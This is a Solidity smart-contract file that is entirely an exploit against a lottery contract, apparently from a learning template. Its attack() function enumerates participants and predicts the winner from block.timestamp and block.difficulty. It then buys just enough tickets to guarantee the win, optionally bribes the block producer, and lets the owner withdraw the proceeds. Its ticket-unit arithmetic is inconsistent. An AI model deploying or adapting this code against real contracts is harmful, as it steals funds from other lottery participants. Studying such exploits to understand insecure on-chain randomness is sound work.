//SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import {YourContract} from "./YourContract.sol";

contract AttackContract {
    address public owner;
    YourContract public lotteryContract;

    constructor(address _lotteryContract) {
        owner = msg.sender;
        lotteryContract = YourContract(_lotteryContract);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can call this function.");
        _;
    }

    function updateLotteryContract(address _lotteryContract) public onlyOwner {
        lotteryContract = YourContract(_lotteryContract);
    }

    function attack() public onlyOwner {
        uint256 totalTickets = 0;
        uint256 round = lotteryContract.lotteryRound();
        uint256 numberOfParticipants = 0;
        for (numberOfParticipants = 0; ; numberOfParticipants++) {
            (bool success, bytes memory data) = address(lotteryContract).call(
                abi.encodeWithSignature(
                    "participantsByRound(uint256,uint256)",
                    round,
                    numberOfParticipants
                )
            );
            if (!success) {
                break;
            }
        }

        for (uint i = 0; i < numberOfParticipants; i++) {
            address participant = lotteryContract.participantsByRound(round, i);
            uint256 value = lotteryContract.contributions(participant, round) /
                1e16;
            totalTickets += value;
        }

        // ensure current address wins
        uint256 balance = address(lotteryContract).balance;
        uint256 ticketToAdd = balance / 10e17;
        for (ticketToAdd = balance / 10e17; ; ticketToAdd++) {
            uint256 winningTicket = (uint256(
                keccak256(abi.encodePacked(block.timestamp, block.difficulty))
            ) % (totalTickets + ticketToAdd));
            if (winningTicket >= totalTickets) {
                break;
            }
        }
        if (ticketToAdd * 1e16 > address(this).balance) {
            revert("Not enough balance");
        }
        lotteryContract.contribute{value: ticketToAdd * 1e16}();
        if (address(this).balance >= 1e18) {
            // bribe miner
            block.coinbase.transfer(1e18);
        }
        // lotteryContract.endLottery();
    }

    function withdraw() public {
        require(msg.sender == owner, "Only owner can withdraw");
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {}
}
